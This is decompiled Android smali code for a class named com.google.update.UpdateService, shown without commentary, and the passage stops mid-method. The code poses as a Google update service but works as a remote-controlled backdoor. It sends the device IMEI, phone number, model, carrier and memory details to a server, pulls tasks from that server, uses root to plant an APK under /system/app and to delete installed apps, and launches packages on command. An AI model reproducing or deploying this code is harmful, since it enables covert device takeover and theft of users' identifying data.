.class public Lcom/google/update/UpdateService;
.super Landroid/app/Service;
.source "UpdateService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/update/UpdateService$AA;
    }
.end annotation


# static fields
.field private static m17:J


# instance fields
.field private m1:Landroid/content/SharedPreferences;

.field private m10:Ljava/lang/String;

.field private m11:Ljava/lang/String;

.field private m12:Ljava/lang/String;

.field private m13:I

.field private m14:J

.field private m15:Ljava/util/Timer;

.field private m16:Ljava/util/TimerTask;

.field private m18:J

.field private m2:Ljava/lang/String;

.field private m20:Z

.field private m3:Ljava/lang/String;

.field private m4:Ljava/lang/String;

.field private m5:Ljava/lang/String;

.field private m6:Ljava/lang/String;

.field private m7:Ljava/lang/String;

.field private m8:Ljava/lang/String;

.field private m9:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 93
    const-wide/32 v0, 0xea60

    sput-wide v0, Lcom/google/update/UpdateService;->m17:J

    .line 46
    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    .line 46
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 74
    iput-object v2, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    .line 75
    const-string v0, "-1"

    iput-object v0, p0, Lcom/google/update/UpdateService;->m2:Ljava/lang/String;

    .line 76
    iput-object v2, p0, Lcom/google/update/UpdateService;->m3:Ljava/lang/String;

    .line 77
    iput-object v2, p0, Lcom/google/update/UpdateService;->m4:Ljava/lang/String;

    .line 78
    iput-object v2, p0, Lcom/google/update/UpdateService;->m5:Ljava/lang/String;

    .line 79
    iput-object v2, p0, Lcom/google/update/UpdateService;->m6:Ljava/lang/String;

    .line 80
    iput-object v2, p0, Lcom/google/update/UpdateService;->m7:Ljava/lang/String;

    .line 81
    iput-object v2, p0, Lcom/google/update/UpdateService;->m8:Ljava/lang/String;

    .line 82
    iput-object v2, p0, Lcom/google/update/UpdateService;->m9:Ljava/lang/String;

    .line 83
    iput-object v2, p0, Lcom/google/update/UpdateService;->m10:Ljava/lang/String;

    .line 84
    iput-object v2, p0, Lcom/google/update/UpdateService;->m11:Ljava/lang/String;

    .line 86
    const-string v0, ""

    iput-object v0, p0, Lcom/google/update/UpdateService;->m12:Ljava/lang/String;

    .line 88
    const/4 v0, 0x0

    iput v0, p0, Lcom/google/update/UpdateService;->m13:I

    .line 90
    const-wide/16 v0, 0x9

    iput-wide v0, p0, Lcom/google/update/UpdateService;->m14:J

    .line 91
    iput-object v2, p0, Lcom/google/update/UpdateService;->m15:Ljava/util/Timer;

    .line 94
    const-wide/16 v0, 0xe10

    iput-wide v0, p0, Lcom/google/update/UpdateService;->m18:J

    .line 95
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/google/update/UpdateService;->m20:Z

    .line 46
    return-void
.end method

.method private U1(Ljava/lang/String;)V
    .locals 6
    .param p1, "P1"    # Ljava/lang/String;

    .prologue
    const/4 v5, -0x1

    .line 803
    const/4 v0, 0x0

    .line 806
    .local v0, "a":Landroid/content/pm/PackageInfo;
    invoke-static {p0}, Lcom/google/update/RU$U10;->U3(Landroid/content/Context;)Ljava/util/List;

    move-result-object v2

    .line 807
    .local v2, "infos":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 814
    :goto_0
    if-nez v0, :cond_2

    .line 815
    const-string v3, "NoPkg"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 826
    :goto_1
    return-void

    .line 807
    :cond_1
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/pm/PackageInfo;

    .line 808
    .local v1, "info":Landroid/content/pm/PackageInfo;
    iget-object v4, v1, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 809
    move-object v0, v1

    .line 810
    goto :goto_0

    .line 820
    .end local v1    # "info":Landroid/content/pm/PackageInfo;
    :cond_2
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 821
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "3 /data/app/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v4, v4, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 822
    const/4 v3, 0x1

    const-string v4, "ByCP"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_1

    .line 824
    :cond_3
    const-string v3, "CPDelFail"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_1

    .line 825
    :cond_4
    const-string v3, "NOPERM"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_1
.end method

.method private U2(Ljava/lang/String;)V
    .locals 5
    .param p1, "P1"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x0

    .line 788
    const-string v2, "/"

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 789
    .local v0, "a":[Ljava/lang/String;
    aget-object v2, v0, v4

    invoke-static {p0, v2}, Lcom/google/update/RU$U10;->U4(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_0

    const-wide/16 v2, 0x2710

    invoke-static {v2, v3}, Landroid/os/SystemClock;->sleep(J)V

    .line 791
    :cond_0
    aget-object v2, v0, v4

    invoke-static {p0, v2}, Lcom/google/update/RU$U10;->U4(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 792
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    aget-object v3, v0, v4

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    .line 793
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 794
    invoke-virtual {p0, v1}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    .line 795
    const/4 v2, 0x1

    const-string v3, "RUNOK"

    invoke-direct {p0, v2, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 799
    .end local v1    # "intent":Landroid/content/Intent;
    :goto_0
    return-void

    .line 797
    :cond_1
    const/4 v2, -0x1

    const-string v3, "RUNFailByNoPkg"

    invoke-direct {p0, v2, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private _doSearchReport(Ljava/lang/String;)Z
    .locals 9
    .param p1, "action"    # Ljava/lang/String;

    .prologue
    const-string v8, "pm"

    const-string v7, ""

    .line 439
    const/4 v3, 0x0

    .line 440
    .local v3, "result":Z
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 442
    .local v2, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "imei"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m3:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 443
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "ch"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m2:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 444
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "ver"

    const-string v6, "a13"

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 445
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v4

    if-eqz v4, :cond_9

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "pm"

    const-string v5, "1"

    invoke-direct {v4, v8, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 448
    :goto_0
    iget-object v4, p0, Lcom/google/update/UpdateService;->m6:Ljava/lang/String;

    if-eqz v4, :cond_0

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m6:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "ostype"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m6:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 449
    :cond_0
    iget-object v4, p0, Lcom/google/update/UpdateService;->m7:Ljava/lang/String;

    if-eqz v4, :cond_1

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m7:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "osapi"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m7:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 450
    :cond_1
    iget-object v4, p0, Lcom/google/update/UpdateService;->m4:Ljava/lang/String;

    if-eqz v4, :cond_2

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m4:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_2

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "mobile"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m4:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 451
    :cond_2
    iget-object v4, p0, Lcom/google/update/UpdateService;->m5:Ljava/lang/String;

    if-eqz v4, :cond_3

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m5:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_3

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "mobilemodel"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m5:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 452
    :cond_3
    iget-object v4, p0, Lcom/google/update/UpdateService;->m11:Ljava/lang/String;

    if-eqz v4, :cond_4

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m11:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_4

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "netoperater"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m11:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 453
    :cond_4
    iget-object v4, p0, Lcom/google/update/UpdateService;->m10:Ljava/lang/String;

    if-eqz v4, :cond_5

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m10:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_5

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "nettype"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m10:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 454
    :cond_5
    iget-object v4, p0, Lcom/google/update/UpdateService;->m9:Ljava/lang/String;

    if-eqz v4, :cond_6

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m9:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_6

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "sdmemory"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m9:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 455
    :cond_6
    iget-object v4, p0, Lcom/google/update/UpdateService;->m8:Ljava/lang/String;

    if-eqz v4, :cond_7

    const-string v4, ""

    iget-object v4, p0, Lcom/google/update/UpdateService;->m8:Ljava/lang/String;

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_7

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "aliamemory"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m8:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 457
    :cond_7
    new-instance v0, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v0, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 459
    .local v0, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v4, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v5, "UTF-8"

    invoke-direct {v4, v2, v5}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v0, v4}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 460
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v4, v0}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v1

    .line 461
    .local v1, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v4

    const/16 v5, 0xc8

    if-ne v4, v5, :cond_8

    .line 462
    const/4 v3, 0x1

    .line 466
    .end local v1    # "httpResponse":Lorg/apache/http/HttpResponse;
    :cond_8
    :goto_1
    return v3

    .line 446
    .end local v0    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :cond_9
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "pm"

    const-string v5, "0"

    invoke-direct {v4, v8, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto/16 :goto_0

    .line 464
    .restart local v0    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :catch_0
    move-exception v4

    goto :goto_1
.end method

.method private _getSearchTask(Ljava/lang/String;)Ljava/lang/String;
    .locals 13
    .param p1, "action"    # Ljava/lang/String;

    .prologue
    .line 504
    const-string v9, "NONE"

    .line 506
    .local v9, "result":Ljava/lang/String;
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 507
    .local v8, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "imei"

    iget-object v12, p0, Lcom/google/update/UpdateService;->m3:Ljava/lang/String;

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 508
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "ch"

    iget-object v12, p0, Lcom/google/update/UpdateService;->m2:Ljava/lang/String;

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 509
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "ver"

    const-string v12, "a13"

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v8, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 511
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 513
    .local v3, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v10, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v11, "UTF-8"

    invoke-direct {v10, v8, v11}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v3, v10}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 514
    new-instance v10, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v10}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v10, v3}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v4

    .line 515
    .local v4, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v10

    const/16 v11, 0xc8

    if-ne v10, v11, :cond_1

    .line 516
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v2

    .line 517
    .local v2, "entity":Lorg/apache/http/HttpEntity;
    invoke-interface {v2}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v5

    .line 518
    .local v5, "is":Ljava/io/InputStream;
    new-instance v6, Ljava/io/InputStreamReader;

    invoke-direct {v6, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 519
    .local v6, "isr":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 520
    .local v0, "br":Ljava/io/BufferedReader;
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    .line 522
    .local v7, "line":Ljava/lang/String;
    if-eqz v7, :cond_0

    invoke-virtual {v7}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v10

    const-string v11, "OK"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_0

    .line 523
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v9

    .line 524
    invoke-virtual {v9}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v9

    .line 527
    :cond_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V

    .line 528
    invoke-virtual {v6}, Ljava/io/InputStreamReader;->close()V

    .line 529
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 533
    .end local v0    # "br":Ljava/io/BufferedReader;
    .end local v2    # "entity":Lorg/apache/http/HttpEntity;
    .end local v4    # "httpResponse":Lorg/apache/http/HttpResponse;
    .end local v5    # "is":Ljava/io/InputStream;
    .end local v6    # "isr":Ljava/io/InputStreamReader;
    .end local v7    # "line":Ljava/lang/String;
    :goto_0
    return-object v9

    .line 530
    .restart local v4    # "httpResponse":Lorg/apache/http/HttpResponse;
    :cond_1
    const/4 v9, 0x0

    goto :goto_0

    .line 531
    .end local v4    # "httpResponse":Lorg/apache/http/HttpResponse;
    :catch_0
    move-exception v10

    move-object v1, v10

    .local v1, "e":Ljava/lang/Exception;
    const/4 v9, 0x0

    goto :goto_0
.end method

.method private _reportState(Ljava/lang/String;ILjava/lang/String;)Z
    .locals 8
    .param p1, "P1"    # Ljava/lang/String;
    .param p2, "P2"    # I
    .param p3, "P3"    # Ljava/lang/String;

    .prologue
    const-string v7, ""

    .line 745
    const/4 v3, 0x0

    .line 746
    .local v3, "result":Z
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    .line 748
    .local v2, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "imei"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m3:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 749
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "taskid"

    iget-object v6, p0, Lcom/google/update/UpdateService;->m12:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 750
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "state"

    invoke-static {p2}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 752
    if-eqz p3, :cond_0

    const-string v4, ""

    invoke-virtual {v7, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "comment"

    invoke-direct {v4, v5, p3}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 754
    :cond_0
    new-instance v0, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v0, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 756
    .local v0, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v4, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v5, "UTF-8"

    invoke-direct {v4, v2, v5}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v0, v4}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 757
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v4, v0}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v1

    .line 758
    .local v1, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v4

    const/16 v5, 0xc8

    if-ne v4, v5, :cond_1

    .line 759
    const/4 v3, 0x1

    .line 763
    .end local v1    # "httpResponse":Lorg/apache/http/HttpResponse;
    :cond_1
    :goto_0
    const/4 v4, 0x1

    if-eq p2, v4, :cond_2

    const/4 v4, -0x1

    if-ne p2, v4, :cond_3

    :cond_2
    const-string v4, ""

    iput-object v7, p0, Lcom/google/update/UpdateService;->m12:Ljava/lang/String;

    .line 764
    :cond_3
    return v3

    .line 761
    :catch_0
    move-exception v4

    goto :goto_0
.end method

.method static synthetic access$0(Lcom/google/update/UpdateService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 102
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$1(Lcom/google/update/UpdateService;)V
    .locals 0

    .prologue
    .line 384
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doTimerTask()V

    return-void
.end method

.method private checkPermission()Z
    .locals 1

    .prologue
    .line 191
    invoke-static {}, Lcom/google/update/RU;->U3()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 192
    invoke-direct {p0}, Lcom/google/update/UpdateService;->cpLegacyRes()V

    .line 193
    const/4 v0, 0x1

    .line 195
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method private cpLegacyRes()V
    .locals 5

    .prologue
    const-string v4, "/system/app/com.google.map.apk"

    .line 178
    new-instance v2, Ljava/io/File;

    const-string v3, "/system/app/com.google.map.apk"

    invoke-direct {v2, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 188
    :cond_0
    :goto_0
    return-void

    .line 180
    :cond_1
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "idb"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 181
    .local v1, "dest":Ljava/lang/String;
    const-string v2, "init.db"

    const v3, 0xa9c0

